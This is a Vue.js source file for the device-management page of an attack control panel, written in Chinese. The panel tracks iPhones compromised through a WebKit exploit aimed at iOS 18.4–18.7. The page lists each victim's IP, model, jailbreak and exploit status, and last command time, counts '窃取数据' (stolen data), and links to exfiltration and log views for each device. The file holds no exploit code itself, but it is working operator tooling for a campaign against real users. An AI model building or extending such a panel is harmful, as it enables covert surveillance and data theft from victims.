<template>
  <div class="devices">
    <el-alert
      title="系统兼容性说明"
      type="info"
      :closable="false"
      show-icon
      style="margin-bottom: 15px;"
    >
      <p>支持 <strong>iOS 18.4 - 18.7</strong>，仅限 <strong>iPhone 15 / 16 系列（A17 Pro / A18 芯片）</strong>；基于 WebKit 漏洞利用，版本不匹配的设备将无法利用。</p>
    </el-alert>

    <el-row :gutter="15" class="stats-row">
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #409eff;">
              <el-icon size="28"><Phone /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.total_devices || 0 }}</div>
              <div class="stat-label">设备总数</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #67c23a;">
              <el-icon size="28"><CircleCheck /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.active_devices || 0 }}</div>
              <div class="stat-label">活跃设备</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #909399;">
              <el-icon size="28"><CircleClose /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.offline_devices || 0 }}</div>
              <div class="stat-label">离线设备</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #f56c6c;">
              <el-icon size="28"><FolderOpened /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.total_exfil || 0 }}</div>
              <div class="stat-label">窃取数据</div>
            </div>
          </div>
        </el-card>
      </el-col>
    </el-row>

    <el-card>
      <div class="toolbar-top">
        <el-radio-group v-model="viewMode" size="default">
          <el-radio-button value="list">
            <el-icon><List /></el-icon>&nbsp;列表视图
          </el-radio-button>
          <el-radio-button value="group">
            <el-icon><Grid /></el-icon>&nbsp;分组视图
          </el-radio-button>
        </el-radio-group>
        <div class="toolbar-top-actions">
          <el-button type="primary" @click="openGroupDialog()">
            <el-icon><Collection /></el-icon>&nbsp;分组管理
          </el-button>
          <el-button @click="refreshAllDevices">
            <el-icon><Refresh /></el-icon>&nbsp;刷新版本信息
          </el-button>
        </div>
      </div>

      <div class="filter-bar">
        <el-input
          v-model="filters.search"
          placeholder="搜索 UUID / IP / 型号 / 版本 / 芯片 / 备注"
          style="width: 320px;"
          clearable
          @keyup.enter="applyFilters"
        >
          <template #prefix><el-icon><Search /></el-icon></template>
        </el-input>
        <el-select v-model="filters.status" placeholder="状态" clearable style="width: 110px;">
          <el-option label="活跃" value="active" />
          <el-option label="离线" value="offline" />
        </el-select>
        <el-select v-model="filters.group_id" placeholder="分组" clearable style="width: 160px;">
          <el-option label="未分组" :value="-1" />
          <el-option v-for="g in groups" :key="g.id" :label="g.name" :value="g.id" />
        </el-select>
        <el-select v-model="filters.os_version" placeholder="iOS版本" clearable filterable style="width: 130px;">
          <el-option v-for="v in osVersionOptions" :key="v" :label="v" :value="v" />
        </el-select>
        <el-select v-model="filters.device_model" placeholder="设备型号" clearable filterable style="width: 140px;">
          <el-option v-for="m in modelOptions" :key="m" :label="m" :value="m" />
        </el-select>
        <el-select v-model="filters.compatible" placeholder="兼容性" clearable style="width: 120px;">
          <el-option label="兼容" value="compatible" />
          <el-option label="版本过低" value="too_low" />
          <el-option label="版本过高" value="too_high" />
          <el-option label="未知" value="unknown" />
        </el-select>
        <el-date-picker
          v-model="filters.first_seen_range"
          type="daterange"
          range-separator="至"
          start-placeholder="首次访问起"
          end-placeholder="首次访问止"
          value-format="YYYY-MM-DD"
          style="width: 260px;"
        />
        <el-date-picker
          v-model="filters.last_seen_range"
          type="daterange"
          range-separator="至"
          start-placeholder="最后访问起"
          end-placeholder="最后访问止"
          value-format="YYYY-MM-DD"
          style="width: 260px;"
        />
        <el-select v-model="filters.sort" placeholder="排序" style="width: 140px;">
          <el-option label="最后访问" value="last_seen" />
          <el-option label="首次访问" value="first_seen" />
          <el-option label="iOS版本" value="os_version" />
          <el-option label="设备型号" value="device_model" />
          <el-option label="状态" value="status" />
          <el-option label="IP地址" value="ip" />
          <el-option label="分组" value="group_id" />
        </el-select>
        <el-radio-group v-model="filters.order" size="small">
          <el-radio-button value="desc">降序</el-radio-button>
          <el-radio-button value="asc">升序</el-radio-button>
        </el-radio-group>
        <el-button type="primary" @click="applyFilters">
          <el-icon><Search /></el-icon>&nbsp;查询
        </el-button>
        <el-button @click="resetFilters">
          <el-icon><RefreshLeft /></el-icon>&nbsp;重置
        </el-button>
      </div>

      <div v-if="selectedIds.length > 0" class="batch-bar">
        <el-tag type="info" effect="dark">
          已选中 <strong>{{ selectedIds.length }}</strong> 台设备
        </el-tag>
        <el-button-group>
          <el-button type="primary" @click="openBatchSetGroupDialog">
            <el-icon><Collection /></el-icon>&nbsp;移至分组
          </el-button>
          <el-button type="warning" @click="openBatchSetStatusDialog">
            <el-icon><Switch /></el-icon>&nbsp;设为状态
          </el-button>
          <el-button type="danger" @click="batchDelete">
            <el-icon><Delete /></el-icon>&nbsp;批量删除
          </el-button>
        </el-button-group>
        <el-button link @click="clearSelection">取消选择</el-button>
      </div>

      <el-row v-if="viewMode === 'group'" :gutter="15" class="group-view">
        <el-col :span="6" v-for="g in groupViewList" :key="'grp-'+g.key">
          <el-card shadow="hover" class="group-card" :class="{'group-card-active': activeGroupKey === g.key}" @click="filterByGroupKey(g.key)">
            <div class="group-card-header">
              <div class="group-card-color" :style="{background: g.color || '#909399'}"></div>
              <div class="group-card-name">{{ g.name }}</div>
              <el-tag class="group-card-count" type="info">{{ g.count }}</el-tag>
            </div>
            <div class="group-card-desc" v-if="g.description">{{ g.description }}</div>
            <div class="group-card-desc text-muted" v-else>共 {{ g.count }} 台设备，点击过滤</div>
          </el-card>
        </el-col>
      </el-row>

      <el-table
        ref="tableRef"
        :data="devices"
        border
        v-loading="loading"
        row-key="device_uuid"
        @selection-change="handleSelectionChange"
        style="margin-top: 12px;"
      >
        <el-table-column type="selection" width="50" reserve-selection />
        <el-table-column prop="device_uuid" label="设备UUID" width="260" show-overflow-tooltip />
        <el-table-column prop="ip" label="IP地址" width="140" />
        <el-table-column prop="os_version" label="iOS版本" width="110">
          <template #default="scope">
            <span v-if="scope.row.os_version">{{ scope.row.os_version }}</span>
            <span v-else class="text-muted">-</span>
          </template>
        </el-table-column>
        <el-table-column prop="device_model" label="设备型号" width="120">
          <template #default="scope">
            <span v-if="scope.row.device_model">{{ scope.row.device_model }}</span>
            <span v-else class="text-muted">-</span>
          </template>
        </el-table-column>
        <el-table-column label="兼容性" width="110">
          <template #default="scope">
            <el-tag :type="getCompatibilityTag(scope.row)" size="small">
              {{ getCompatibilityText(scope.row) }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column label="分组" width="160">
          <template #default="scope">
            <el-select
              :model-value="scope.row.group ? scope.row.group.id : (scope.row.group_id || -1)"
              placeholder="未分组"
              size="small"
              clearable
              style="width: 140px;"
              @change="(val) => quickSetGroup(scope.row, val)"
            >
              <el-option label="未分组" :value="-1" />
              <el-option v-for="g in groups" :key="g.id" :label="g.name" :value="g.id">
                <span class="dot" :style="{background:g.color}"></span>{{ g.name }}
              </el-option>
            </el-select>
          </template>
        </el-table-column>
        <el-table-column label="备注" width="180">
          <template #default="scope">
            <el-popover
              placement="left"
              :width="320"
              trigger="click"
              :title="'编辑备注 - ' + (scope.row.device_uuid||'').slice(0,12)+'...'"
            >
              <el-input
                v-model="scope.row.note"
                type="textarea"
                :rows="3"
                maxlength="500"
                show-word-limit
                placeholder="填写设备备注信息"
              />
              <div style="text-align:right;margin-top:8px;">
                <el-button size="small" @click="$event = null">取消</el-button>
                <el-button size="small" type="primary" @click="saveNote(scope.row)">保存</el-button>
              </div>
              <template #reference>
                <span class="note-cell" v-if="scope.row.note">{{ scope.row.note }}</span>
                <span class="note-cell text-muted add-note" v-else>+ 添加备注</span>
              </template>
            </el-popover>
          </template>
        </el-table-column>
        <el-table-column prop="first_seen" label="首次访问" width="160">
          <template #default="scope">{{ formatDateTime(scope.row.first_seen) }}</template>
        </el-table-column>
        <el-table-column prop="last_seen" label="最后访问" width="160">
          <template #default="scope">{{ formatDateTime(scope.row.last_seen) }}</template>
        </el-table-column>
        <el-table-column prop="status" label="状态" width="80">
          <template #default="scope">
            <el-tag :type="scope.row.status === 'active' ? 'success' : 'info'" size="small">
              {{ scope.row.status === 'active' ? '活跃' : '离线' }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column label="操作" width="260" fixed="right">
          <template #default="scope">
            <el-button size="small" type="primary" @click="viewDetail(scope.row)">详情</el-button>
            <el-button size="small" @click="viewLogs(scope.row.device_uuid)">日志</el-button>
            <el-button size="small" @click="viewExfil(scope.row.device_uuid)">数据</el-button>
            <el-button size="small" type="danger" @click="deleteDevice(scope.row)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>

      <el-pagination
        style="margin-top: 15px;"
        @size-change="handleSizeChange"
        @current-change="handleCurrentChange"
        :current-page="pagination.page"
        :page-sizes="[10, 20, 50, 100]"
        :page-size="pagination.size"
        :total="pagination.total"
        layout="total, sizes, prev, pager, next, jumper"
      />
    </el-card>

    <el-dialog title="设备详情" v-model="detailDialogVisible" width="60%">
      <div v-loading="detailLoading">
        <el-descriptions :column="2" border v-if="currentDevice">
          <el-descriptions-item label="设备UUID">{{ currentDevice.device_uuid }}</el-descriptions-item>
          <el-descriptions-item label="IP地址">{{ currentDevice.ip || '-' }}</el-descriptions-item>
          <el-descriptions-item label="状态">
            <el-tag :type="currentDevice.status === 'active' ? 'success' : 'info'">
              {{ currentDevice.status === 'active' ? '活跃' : '离线' }}
            </el-tag>
          </el-descriptions-item>
          <el-descriptions-item label="分组">
            <el-tag v-if="currentDevice.group" :style="{borderColor:currentDevice.group.color,color:currentDevice.group.color}">
              {{ currentDevice.group.name }}
            </el-tag>
            <span v-else class="text-muted">未分组</span>
          </el-descriptions-item>
          <el-descriptions-item label="iOS版本">{{ currentDevice.os_version || '-' }}</el-descriptions-item>
          <el-descriptions-item label="设备型号">{{ currentDevice.device_model || '-' }}</el-descriptions-item>
          <el-descriptions-item label="芯片型号">{{ currentDevice.chipset || '-' }}</el-descriptions-item>
          <el-descriptions-item label="越狱状态">
            <el-tag :type="currentDevice.jailbroken === 'yes' ? 'danger' : 'info'">
              {{ currentDevice.jailbroken || '-' }}
            </el-tag>
          </el-descriptions-item>
          <el-descriptions-item label="漏洞状态">
            <el-tag :type="getExploitStatusTag(currentDevice.exploit_status)">
              {{ getExploitStatusText(currentDevice.exploit_status) }}
            </el-tag>
          </el-descriptions-item>
          <el-descriptions-item label="兼容性">
            <el-tag :type="getCompatibilityTag(currentDevice)">
              {{ getCompatibilityText(currentDevice) }}
            </el-tag>
          </el-descriptions-item>
          <el-descriptions-item label="首次访问">{{ formatDateTime(currentDevice.first_seen) }}</el-descriptions-item>
          <el-descriptions-item label="最后访问">{{ formatDateTime(currentDevice.last_seen) }}</el-descriptions-item>
          <el-descriptions-item label="最后命令时间" span="2">
            {{ currentDevice.last_command_time ? formatDateTime(currentDevice.last_command_time) : '-' }}
          </el-descriptions-item>
          <el-descriptions-item label="备注" span="2">
            <el-input
              :model-value="currentDevice.note"
              type="textarea"
              :rows="2"
              maxlength="500"
              show-word-limit
              placeholder="填写备注"
              @update:model-value="currentDevice.note = $event"
            />
            <div style="margin-top:6px;">
              <el-button size="small" type="primary" @click="saveNote(currentDevice)">保存备注</el-button>
            </div>
          </el-descriptions-item>
          <el-descriptions-item label="User Agent" span="2">
            <el-input :model-value="currentDevice.user_agent" type="textarea" :rows="3" readonly style="width:100%;" />
          </el-descriptions-item>
        </el-descriptions>
      </div>
      <template #footer>
        <el-button @click="detailDialogVisible = false">关闭</el-button>
        <el-button type="primary" @click="goToDeviceDetail">查看完整详情</el-button>
      </template>
    </el-dialog>

    <el-dialog title="分组管理" v-model="groupDialogVisible" width="650px">
      <div style="margin-bottom: 12px;">
        <el-button type="primary" @click="startCreateGroup">
          <el-icon><Plus /></el-icon>&nbsp;新建分组
        </el-button>
        <span class="text-muted" style="margin-left:12px;">
          未分组设备：<el-tag type="info">{{ groupsSummary.ungrouped_count || 0 }}</el-tag>
        </span>
      </div>
      <el-table :data="groups" border stripe v-loading="groupsLoading">
        <el-table-column label="颜色" width="70" align="center">
          <template #default="scope">
            <span class="swatch" :style="{background: scope.row.color || '#409EFF'}"></span>
          </template>
        </el-table-column>
        <el-table-column prop="name" label="分组名称" width="160" />
        <el-table-column prop="description" label="描述" show-overflow-tooltip />
        <el-table-column label="设备数" width="90" align="center">
          <template #default="scope"><el-tag type="info">{{ scope.row.device_count || 0 }}</el-tag></template>
        </el-table-column>
        <el-table-column prop="created_at" label="创建时间" width="160">
          <template #default="scope">{{ formatDateTime(scope.row.created_at) }}</template>
        </el-table-column>
        <el-table-column label="操作" width="170" fixed="right">
          <template #default="scope">
            <el-button size="small" type="primary" @click="startEditGroup(scope.row)">编辑</el-button>
            <el-button size="small" type="danger" @click="startDeleteGroup(scope.row)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>

      <el-divider v-if="groupFormVisible" />
      <div v-if="groupFormVisible">
        <h4>{{ groupEditing ? '编辑分组' : '新建分组' }}</h4>
        <el-form :model="groupForm" label-width="80px">
          <el-form-item label="名称">
            <el-input v-model="groupForm.name" maxlength="100" placeholder="分组名称" />
          </el-form-item>
          <el-form-item label="颜色">
            <el-color-picker v-model="groupForm.color" />
          </el-form-item>
          <el-form-item label="描述">
            <el-input v-model="groupForm.description" type="textarea" :rows="2" maxlength="500" />
          </el-form-item>
          <el-form-item>
            <el-button type="primary" @click="submitGroupForm">保存</el-button>
            <el-button @click="groupFormVisible = false">取消</el-button>
          </el-form-item>
        </el-form>
      </div>

      <el-divider v-if="deleteGroupTarget" />
      <div v-if="deleteGroupTarget">
        <h4>删除分组：<el-tag type="danger">{{ deleteGroupTarget.name }}</el-tag></h4>
        <p class="text-muted">该分组下有 <strong>{{ deleteGroupTarget.device_count || 0 }}</strong> 台设备，请选择处理方式：</p>
        <el-form label-width="120px">
          <el-form-item label="设备迁移到">
            <el-select v-model="deleteMoveTarget" style="width:260px;">
              <el-option label="保留为未分组" :value="-1" />
              <el-option
                v-for="g in groups.filter(x => x.id !== deleteGroupTarget.id)"
                :key="g.id"
                :label="g.name"
                :value="g.id"
              />
            </el-select>
          </el-form-item>
          <el-form-item>
            <el-button type="danger" @click="confirmDeleteGroup">确认删除</el-button>
            <el-button @click="deleteGroupTarget = null; deleteMoveTarget = -1;">取消</el-button>
          </el-form-item>
        </el-form>
      </div>
    </el-dialog>

    <el-dialog title="批量 - 移至分组" v-model="batchGroupDialogVisible" width="450px">
      <p>将 <strong>{{ selectedIds.length }}</strong> 台设备移动到：</p>
      <el-select v-model="batchGroupId" placeholder="选择分组" style="width:100%;margin:12px 0;">
        <el-option label="未分组" :value="-1" />
        <el-option v-for="g in groups" :key="g.id" :label="g.name" :value="g.id">
          <span class="dot" :style="{background:g.color}"></span>{{ g.name }}
        </el-option>
      </el-select>
      <template #footer>
        <el-button @click="batchGroupDialogVisible = false">取消</el-button>
        <el-button type="primary" @click="confirmBatchSetGroup">确认移动</el-button>
      </template>
    </el-dialog>

    <el-dialog title="批量 - 设置状态" v-model="batchStatusDialogVisible" width="450px">
      <p>将 <strong>{{ selectedIds.length }}</strong> 台设备状态设为：</p>
      <el-radio-group v-model="batchStatus" style="margin:12px 0;">
        <el-radio-button value="active">活跃</el-radio-button>
        <el-radio-button value="offline">离线</el-radio-button>
      </el-radio-group>
      <template #footer>
        <el-button @click="batchStatusDialogVisible = false">取消</el-button>
        <el-button type="primary" @click="confirmBatchSetStatus">确认</el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted, computed, nextTick } from 'vue'
import { useRouter } from 'vue-router'
import axios from '../utils/axios'
import { ElMessage, ElMessageBox } from 'element-plus'
import {
  Phone, CircleCheck, CircleClose, FolderOpened, Search, List, Grid,
  Refresh, RefreshLeft, Collection, Delete, Switch, Plus
} from '@element-plus/icons-vue'
import { formatDateTime, formatStatus } from '../utils'

const router = useRouter()

const devices = ref([])
const loading = ref(false)
const stats = ref({})
const selectedIds = ref([])
const tableRef = ref(null)

const viewMode = ref('list')
const activeGroupKey = ref(null)

const filters = reactive({
  search: '',
  status: '',
  group_id: null,
  os_version: '',
  device_model: '',
  compatible: '',
  first_seen_range: [],
  last_seen_range: [],
  sort: 'last_seen',
  order: 'desc'
})

const pagination = reactive({
  page: 1,
  size: 20,
  total: 0
})

const detailDialogVisible = ref(false)
const detailLoading = ref(false)
const currentDevice = ref(null)

const groups = ref([])
const groupsLoading = ref(false)
const groupsSummary = ref({})

const groupDialogVisible = ref(false)
const groupFormVisible = ref(false)
const groupEditing = ref(null)
const groupForm = reactive({ name: '', color: '#409EFF', description: '' })
const deleteGroupTarget = ref(null)
const deleteMoveTarget = ref(-1)

const batchGroupDialogVisible = ref(false)
const batchGroupId = ref(-1)
const batchStatusDialogVisible = ref(false)
const batchStatus = ref('active')

const osVersionOptions = computed(() => {
  const s = new Set()
  if (stats.value.by_os_version) Object.keys(stats.value.by_os_version).forEach(v => v && s.add(v))
  devices.value.forEach(d => d.os_version && s.add(d.os_version))
  return Array.from(s).sort()
})
const modelOptions = computed(() => {
  const s = new Set()
  if (stats.value.by_model) Object.keys(stats.value.by_model).forEach(m => m && s.add(m))
  devices.value.forEach(d => d.device_model && s.add(d.device_model))
  return Array.from(s).sort()
})

const groupViewList = computed(() => {
  const list = []
  list.push({ key: 'ungrouped', name: '未分组', color: '#909399', description: '', count: groupsSummary.value.ungrouped_count || 0 })
  groups.value.forEach(g => list.push({ key: 'g-' + g.id, name: g.name, color: g.color, description: g.description, count: g.device_count || 0 }))
  return list
})

function getExploitStatusTag(status) {
  const tags = { 'success': 'success', 'failed': 'danger', 'in_progress': 'warning' }
  return tags[status] || 'info'
}
function getExploitStatusText(status) {
  const texts = { 'success': '已成功利用', 'failed': '利用失败', 'in_progress': '正在利用中' }
  return texts[status] || (status || '-')
}
function getCompatibilityTag(row) {
  if (!row) return 'info'
  const lvl = (row.compatible_level !== undefined) ? row.compatible_level : null
  if (lvl === 'compatible') return 'success'
  if (lvl === 'too_low') return 'danger'
  if (lvl === 'too_high') return 'warning'
  if (!row.os_version) return 'info'
  const supported = ['18.4', '18.5', '18.6', '18.7']
  if (supported.includes(row.os_version)) return 'success'
  const parts = (row.os_version || '').split('.').map(Number)
  const major = parts[0] || 0, minor = parts[1] || 0
  if (major < 18 || (major === 18 && minor < 4)) return 'danger'
  return 'warning'
}
function getCompatibilityText(row) {
  if (!row) return '未知'
  const lvl = (row.compatible_level !== undefined) ? row.compatible_level : null
  if (lvl === 'compatible') return '兼容'
  if (lvl === 'too_low') return '版本过低'
  if (lvl === 'too_high') return '版本过高'
  if (!row.os_version) return '未知'
  const supported = ['18.4', '18.5', '18.6', '18.7']
  if (supported.includes(row.os_version)) return '兼容'
  const parts = (row.os_version || '').split('.').map(Number)
  const major = parts[0] || 0, minor = parts[1] || 0
  if (major < 18 || (major === 18 && minor < 4)) return '版本过低'
  return '版本过高'
}

async function loadStats() {
  try {
    const response = await axios.get('/api/devices/stats')
    stats.value = response.data
  } catch (e) {
    console.error('加载统计数据失败:', e)
  }
}

async function loadGroups() {
  groupsLoading.value = true
  try {
    const r = await axios.get('/api/devices/groups')
    groups.value = r.data.items || []
    groupsSummary.value = { total: r.data.total || 0, ungrouped_count: r.data.ungrouped_count || 0 }
  } catch (e) {
    console.error('加载分组失败:', e)
  } finally {
    groupsLoading.value = false
  }
}

async function loadDevices() {
  loading.value = true
  try {
    const params = new URLSearchParams()
    params.append('skip', String((pagination.page - 1) * pagination.size))
    params.append('limit', String(pagination.size))
    if (filters.search) params.append('search', filters.search)
    if (filters.status) params.append('status', filters.status)
    if (filters.group_id === -1) params.append('ungrouped_only', 'true')
    else if (filters.group_id != null && filters.group_id !== '') params.append('group_id', String(filters.group_id))
    if (filters.os_version) params.append('os_version', filters.os_version)
    if (filters.device_model) params.append('device_model', filters.device_model)
    if (filters.compatible) params.append('compatible', filters.compatible)
    if (filters.first_seen_range && filters.first_seen_range.length === 2) {
      params.append('first_seen_from', filters.first_seen_range[0])
      params.append('first_seen_to', filters.first_seen_range[1])
    }
    if (filters.last_seen_range && filters.last_seen_range.length === 2) {
      params.append('last_seen_from', filters.last_seen_range[0])
      params.append('last_seen_to', filters.last_seen_range[1])
    }
    if (filters.sort) params.append('sort', filters.sort)
    if (filters.order) params.append('order', filters.order)

    const response = await axios.get(`/api/devices?${params.toString()}`)
    const data = response.data || {}
    devices.value = Array.isArray(data) ? data : (data.items || [])
    pagination.total = Array.isArray(data) ? data.length : (data.total || 0)
  } catch (e) {
    console.error('加载设备失败:', e)
    ElMessage.error('加载设备失败')
  } finally {
    loading.value = false
  }
}

function applyFilters() {
  pagination.page = 1
  loadDevices()
}

function resetFilters() {
  filters.search = ''
  filters.status = ''
  filters.group_id = null
  filters.os_version = ''
  filters.device_model = ''
  filters.compatible = ''
  filters.first_seen_range = []
  filters.last_seen_range = []
  filters.sort = 'last_seen'
  filters.order = 'desc'
  activeGroupKey.value = null
  pagination.page = 1
  loadDevices()
}

function filterByGroupKey(key) {
  activeGroupKey.value = key
  if (key === 'ungrouped') {
    filters.group_id = -1
  } else if (key && key.startsWith('g-')) {
    filters.group_id = Number(key.slice(2))
  } else {
    filters.group_id = null
  }
  applyFilters()
}

function handleSelectionChange(selection) {
  selectedIds.value = selection.map(item => item.device_uuid)
}

function clearSelection() {
  if (tableRef.value) tableRef.value.clearSelection()
  selectedIds.value = []
}

function viewDetail(row) {
  currentDevice.value = JSON.parse(JSON.stringify(row))
  detailDialogVisible.value = true
}

function goToDeviceDetail() {
  if (!currentDevice.value) return
  detailDialogVisible.value = false
  router.push(`/devices/${currentDevice.value.device_uuid}`)
}

function viewLogs(uuid) {
  router.push(`/logs?device_uuid=${uuid}`)
}
function viewExfil(uuid) {
  router.push(`/exfil?device_uuid=${uuid}`)
}

async function deleteDevice(row) {
  try {
    await ElMessageBox.confirm('确定要删除这个设备吗？此操作将同时删除关联的数据。', '提示', { type: 'warning' })
    await axios.delete(`/api/devices/${row.device_uuid}`)
    ElMessage.success('删除成功')
    afterDataChanged()
  } catch (e) {
    if (e !== 'cancel') ElMessage.error('删除失败')
  }
}

async function batchDelete() {
  if (selectedIds.value.length === 0) return
  try {
    await ElMessageBox.confirm(
      `确定要批量删除选中的 ${selectedIds.value.length} 台设备吗？此操作将同时删除关联的数据。`,
      '提示', { type: 'warning' }
    )
    const r = await axios.post('/api/devices/batch-delete', { device_uuids: selectedIds.value })
    ElMessage.success(`已删除 ${r.data.deleted || 0} 台设备`)
    clearSelection()
    afterDataChanged()
  } catch (e) {
    if (e !== 'cancel') ElMessage.error('批量删除失败')
  }
}

function openBatchSetGroupDialog() {
  batchGroupId.value = -1
  batchGroupDialogVisible.value = true
}
async function confirmBatchSetGroup() {
  try {
    const gid = batchGroupId.value === -1 ? null : batchGroupId.value
    const r = await axios.post('/api/devices/batch-set-group', { device_uuids: selectedIds.value, group_id: gid })
    ElMessage.success(`已移动 ${r.data.updated || 0} 台设备`)
    batchGroupDialogVisible.value = false
    clearSelection()
    afterDataChanged()
  } catch (e) {
    ElMessage.error(e?.response?.data?.detail || '操作失败')
  }
}

function openBatchSetStatusDialog() {
  batchStatus.value = 'active'
  batchStatusDialogVisible.value = true
}
async function confirmBatchSetStatus() {
  try {
    const r = await axios.post('/api/devices/batch-set-status', { device_uuids: selectedIds.value, status: batchStatus.value })
    ElMessage.success(`已更新 ${r.data.updated || 0} 台设备状态`)
    batchStatusDialogVisible.value = false
    clearSelection()
    afterDataChanged()
  } catch (e) {
    ElMessage.error(e?.response?.data?.detail || '操作失败')
  }
}

async function quickSetGroup(row, val) {
  try {
    const gid = (val === -1 || val == null || val === '') ? 0 : Number(val)
    await axios.patch(`/api/devices/${row.device_uuid}`, { group_id: gid })
    ElMessage.success('分组已更新')
    afterDataChanged()
  } catch (e) {
    ElMessage.error(e?.response?.data?.detail || '更新分组失败')
  }
}

async function saveNote(row) {
  try {
    await axios.patch(`/api/devices/${row.device_uuid}`, { note: row.note || '' })
    ElMessage.success('备注已保存')
    afterDataChanged()
  } catch (e) {
    ElMessage.error(e?.response?.data?.detail || '保存备注失败')
  }
}

async function refreshAllDevices() {
  try {
    const response = await axios.post('/api/devices/refresh-all')
    ElMessage.success(response.data.message)
    afterDataChanged()
  } catch (e) {
    ElMessage.error('刷新失败')
  }
}

function afterDataChanged() {
  loadDevices()
  loadStats()
  loadGroups()
}

function handleSizeChange(size) {
  pagination.size = size
  pagination.page = 1
  loadDevices()
}
function handleCurrentChange(page) {
  pagination.page = page
  loadDevices()
}

function openGroupDialog() {
  groupDialogVisible.value = true
  groupFormVisible.value = false
  deleteGroupTarget.value = null
  deleteMoveTarget.value = -1
  loadGroups()
}

function startCreateGroup() {
  groupEditing.value = null
  groupForm.name = ''
  groupForm.color = '#409EFF'
  groupForm.description = ''
  groupFormVisible.value = true
}

function startEditGroup(g) {
  groupEditing.value = g
  groupForm.name = g.name
  groupForm.color = g.color || '#409EFF'
  groupForm.description = g.description || ''
  groupFormVisible.value = true
}

async function submitGroupForm() {
  const name = (groupForm.name || '').trim()
  if (!name) { ElMessage.warning('请填写分组名称'); return }
  try {
    if (groupEditing.value) {
      await axios.patch(`/api/devices/groups/${groupEditing.value.id}`, {
        name, color: groupForm.color, description: groupForm.description
      })
      ElMessage.success('分组已更新')
    } else {
      await axios.post('/api/devices/groups', {
        name, color: groupForm.color, description: groupForm.description
      })
      ElMessage.success('分组已创建')
    }
    groupFormVisible.value = false
    groupEditing.value = null
    afterDataChanged()
  } catch (e) {
    ElMessage.error(e?.response?.data?.detail || '保存分组失败')
  }
}

function startDeleteGroup(g) {
  deleteGroupTarget.value = g
  deleteMoveTarget.value = -1
}

async function confirmDeleteGroup() {
  if (!deleteGroupTarget.value) return
  try {
    let url = `/api/devices/groups/${deleteGroupTarget.value.id}`
    if (deleteMoveTarget.value > 0) {
      url += `?move_devices_to_group_id=${deleteMoveTarget.value}`
    }
    await axios.delete(url)
    ElMessage.success('分组已删除')
    deleteGroupTarget.value = null
    deleteMoveTarget.value = -1
    afterDataChanged()
  } catch (e) {
    ElMessage.error(e?.response?.data?.detail || '删除分组失败')
  }
}

onMounted(async () => {
  await Promise.all([loadStats(), loadGroups()])
  loadDevices()
})
</script>

<style scoped>
.stats-row { margin-bottom: 15px; }
.distribution-row { margin-bottom: 15px; }
.stat-card { display: flex; align-items: center; gap: 15px; }
.stat-icon { width: 60px; height: 60px; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: white; }
.stat-info { flex: 1; }
.stat-value { font-size: 24px; font-weight: bold; color: #333; }
.stat-label { font-size: 14px; color: #999; margin-top: 5px; }

.tag-wrap { display: flex; flex-wrap: wrap; gap: 6px; }
.dist-tag { margin-right: 0 !important; }

.toolbar-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; flex-wrap: wrap; gap: 10px; }
.toolbar-top-actions { display: flex; gap: 10px; }

.filter-bar { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; padding: 10px; background: #fafafa; border-radius: 6px; margin-bottom: 10px; }

.batch-bar { display: flex; align-items: center; gap: 12px; padding: 10px 14px; background: linear-gradient(90deg,#ecf5ff,#e1f3d8); border: 1px solid #d9ecff; border-radius: 6px; margin: 10px 0; }

.group-view { margin-top: 12px; margin-bottom: 12px; }
.group-card { cursor: pointer; transition: all 0.2s; }
.group-card:hover { transform: translateY(-2px); }
.group-card-active { outline: 2px solid #409EFF; }
.group-card-header { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; }
.group-card-color { width: 14px; height: 14px; border-radius: 50%; flex-shrink: 0; }
.group-card-name { font-weight: 600; font-size: 15px; flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.group-card-count { font-weight: 600; }
.group-card-desc { font-size: 13px; color: #606266; line-height: 1.5; min-height: 20px; }

.note-cell { display: inline-block; max-width: 100%; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; cursor: pointer; padding: 2px 4px; border-radius: 4px; }
.note-cell:hover { background: #ecf5ff; }
.add-note { color: #c0c4cc; }

.text-muted { color: #909399; }

.swatch { display: inline-block; width: 24px; height: 24px; border-radius: 4px; border: 1px solid #ddd; }
.dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 6px; vertical-align: middle; }
</style>
